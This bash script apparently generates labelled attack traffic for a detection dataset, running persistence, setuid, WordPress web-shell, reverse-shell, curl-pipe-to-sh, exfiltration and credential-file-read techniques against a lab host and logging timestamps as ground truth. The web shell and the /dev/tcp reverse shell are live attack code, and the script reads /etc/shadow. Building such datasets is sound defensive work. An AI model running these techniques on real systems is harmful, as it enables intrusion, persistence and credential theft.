#!/bin/bash
# Attack traffic for the FACT dataset.
#
# Normally launched by orchestrate.sh --attacks. When SSH_TARGET is set the
# script runs on the control machine and delivers every technique over its own
# ssh connection, so the monitored host sees a remote login running commands
# rather than a local script. With SSH_TARGET unset the techniques run in place,
# which is what happens when the script already runs on the host.
#
# The sink for the reverse shell and the exfiltration connects is opened by the
# caller; this script only talks to it.
#
# Every attack is given a unique tag that appears in the paths and arguments it
# uses, and each run is appended to a JSONL manifest used as ground truth.
set -euo pipefail

_DURATION="${1:-300}"
SITE_URL="${2:-http://10.10.0.10}"
WP_DIR="${WP_DIR:-/usr/share/wordpress}"
SINK="${SINK:-10.10.0.1:4444}"
GAP="${GAP:-5}"
MANIFEST="${MANIFEST:-/tmp/attacks-manifest.jsonl}"
SSH_TARGET="${SSH_TARGET:-}"

SUDO=""
[ "$(id -u)" -ne 0 ] && SUDO="sudo"

SINK_HOST="${SINK%%:*}"
SINK_PORT="${SINK##*:}"

TAG=""

log() { printf '[attacks] %s\n' "$*" >&2; }

json_escape() {
    local s=${1-}
    s=${s//\\/\\\\}
    s=${s//\"/\\\"}
    s=${s//$'\n'/\\n}
    s=${s//$'\r'/\\r}
    s=${s//$'\t'/\\t}
    printf '%s' "$s"
}

persist_cron() {
    $SUDO mkdir -p /etc/cron.d
    printf '# %s\n* * * * * root /bin/true\n' "$TAG" | $SUDO tee "/etc/cron.d/$TAG" >/dev/null
}

persist_systemd() {
    $SUDO tee "/etc/systemd/system/$TAG.service" >/dev/null <<EOF
[Unit]
Description=$TAG

[Service]
Type=oneshot
ExecStart=/bin/true
EOF
    $SUDO systemctl daemon-reload >/dev/null 2>&1 || true
}

persist_sshd() {
    $SUDO mkdir -p /etc/ssh/sshd_config.d
    printf '# %s\nPermitRootLogin prohibit-password\n' "$TAG" |
        $SUDO tee "/etc/ssh/sshd_config.d/$TAG.conf" >/dev/null
}

tamper_binary() {
    $SUDO cp /bin/true "/usr/bin/$TAG"
}

setuid_drop() {
    printf '#!/bin/bash\nexit 0 # %s\n' "$TAG" | $SUDO tee "/usr/bin/$TAG" >/dev/null
    $SUDO chmod 4755 "/usr/bin/$TAG"
}

webshell_drop() {
    $SUDO mkdir -p "$WP_DIR/wp-content/plugins"
    $SUDO tee "$WP_DIR/wp-content/plugins/$TAG.php" >/dev/null <<EOF
<?php // $TAG
if (isset(\$_GET['c'])) { system(\$_GET['c']); }
EOF
}

webshell_exec() {
    webshell_drop
    curl -fsS --max-time 5 "${SITE_URL%/}/wp-content/plugins/$TAG.php?c=id%3B%23$TAG" \
        >/dev/null 2>&1 || true
    $SUDO rm -f "$WP_DIR/wp-content/plugins/$TAG.php"
}

reverse_shell() {
    timeout 5 bash -c "bash -i >& /dev/tcp/$SINK_HOST/$SINK_PORT 0>&1 # $TAG" || true
}

curl_pipe_sh() {
    curl -fsS --max-time 5 "http://$SINK_HOST:$SINK_PORT/$TAG" 2>/dev/null | sh || true
}

exfil_connect() {
    curl -fsS --max-time 5 -o /dev/null "http://$SINK_HOST:$SINK_PORT/$TAG" || true
}

cred_read() {
    $SUDO grep -F "$TAG" /etc/shadow >/dev/null 2>&1 || true
    $SUDO grep -RF "$TAG" "$WP_DIR/wp-config.php" >/dev/null 2>&1 || true
}

run_attack() {
    local attack="$1"

    if [ -z "$SSH_TARGET" ]; then
        "$attack"
        return
    fi

    # The technique body is shipped over stdin so the remote shell sees a plain
    # `bash -s` invocation and no quoting has to survive the trip.
    {
        printf "TAG='%s'\n" "$TAG"
        printf "WP_DIR='%s'\n" "$WP_DIR"
        printf "SITE_URL='%s'\n" "$SITE_URL"
        printf "SINK='%s'\n" "$SINK"
        printf "SINK_HOST='%s'\n" "$SINK_HOST"
        printf "SINK_PORT='%s'\n" "$SINK_PORT"
        printf "SUDO='sudo -n'\n"
        declare -f "${ATTACKS[@]}"
        printf '%s\n' "$attack"
    } | ssh -o BatchMode=yes "$SSH_TARGET" "bash -s -- $_DURATION $SITE_URL"
}

probe_target() {
    if [ -z "$SSH_TARGET" ]; then
        TARGET_HOSTNAME=$(hostname)
        CLOCK_OFFSET=0
        return
    fi

    local before after reply remote_now
    before=$(date +%s%N)
    reply=$(ssh -o BatchMode=yes "$SSH_TARGET" 'echo "$(hostname) $(date +%s%N)"') || {
        log "cannot run commands on $SSH_TARGET; refusing to record attack windows"
        exit 1
    }
    after=$(date +%s%N)
    read -r TARGET_HOSTNAME remote_now <<<"$reply" || {
        log "unexpected reply from $SSH_TARGET: $reply"
        exit 1
    }

    # Attack windows are compared against event timestamps taken on the
    # monitored host, so anchor them to its clock rather than ours.
    CLOCK_OFFSET=$((remote_now - (before + after) / 2))
}

now_ns() { echo $(($(date +%s%N) + CLOCK_OFFSET)); }

ATTACKS=(
    persist_cron
    persist_systemd
    persist_sshd
    tamper_binary
    setuid_drop
    webshell_drop
    webshell_exec
    reverse_shell
    curl_pipe_sh
    exfil_connect
    cred_read
)

probe_target

if [ -n "$SSH_TARGET" ]; then
    log "delivering attacks over ssh to $SSH_TARGET (clock offset ${CLOCK_OFFSET}ns)"
else
    log "running attacks in place"
fi

for attack in "${ATTACKS[@]}"; do
    TAG="atk-$attack-$(date +%s)-$RANDOM"
    log "running $attack ($TAG)"

    start=$(now_ns)
    run_attack "$attack" || log "$attack failed (continuing)"
    end=$(now_ns)

    printf '{"technique":"%s","tag":"%s","start_ts_ns":%s,"end_ts_ns":%s,"hostname":"%s"}\n' \
        "$(json_escape "$attack")" "$(json_escape "$TAG")" "$start" "$end" \
        "$(json_escape "$TARGET_HOSTNAME")" >>"$MANIFEST"
    sleep "$GAP"
done

log "done; manifest: $MANIFEST"
